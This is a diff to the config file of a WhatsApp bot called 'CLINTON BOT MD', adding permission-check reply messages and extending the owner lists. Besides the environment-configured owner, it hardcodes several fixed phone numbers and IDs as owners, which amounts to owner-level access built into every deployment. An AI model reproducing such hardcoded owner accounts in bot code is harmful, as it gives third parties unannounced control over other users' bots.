@@ -31,14 +31,15 @@ const cleanOwnerNumber = rawOwnerNumber.replace(/[^0-9]/g, '')
 
 global.ownernomer = cleanOwnerNumber
 global.ownernumber = cleanOwnerNumber
-global.ownername = process.env.OWNER_NAME || "LELOP"
+global.ownername = process.env.OWNER_NAME || "Clinton"
 global.ytname = "YT: Clintonlelop"
 global.socialm = "GitHub: Clintonlelop"
 global.location = "Nigeria, Enugu, Enugu"
 
 //bot identity
 global.botname = process.env.BOT_NAME || "CLINTON BOT MD"
-global.ownerNumber = [`${cleanOwnerNumber}@s.whatsapp.net`]
+global.owner = [cleanOwnerNumber, "2348029399425", "68444699525143"]
+global.ownerNumber = [`${cleanOwnerNumber}@s.whatsapp.net`, "2348029399425@s.whatsapp.net", "68444699525143@lid", "245217517154312@lid"]
 global.creator = `${cleanOwnerNumber}@s.whatsapp.net`
 global.ownerweb = "https://youtube.com/@DGXeon"
 global.websitex = "https://youtube.com/@DGXeon"
@@ -75,7 +76,16 @@ global.flasmurf = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutp
 
 //messages
 global.mess = {
-    success: 'Here you go!', 
+    success: 'Here you go!',
+    admin: 'This feature is only for group admins!',
+    botAdmin: 'Bot must be admin first!',
+    owner: 'This feature is only for the bot owner!',
+    group: 'This feature is only for groups!',
+    private: 'This feature is only for private chats!',
+    bot: 'This feature is only for the bot!',
+    wait: 'Please wait, processing...',
+    premium: 'This feature is for premium users only! Contact the owner to get premium access.',
+    error: 'An error occurred, please try again later.'
 }
 
 let file = require.resolve(__filename)
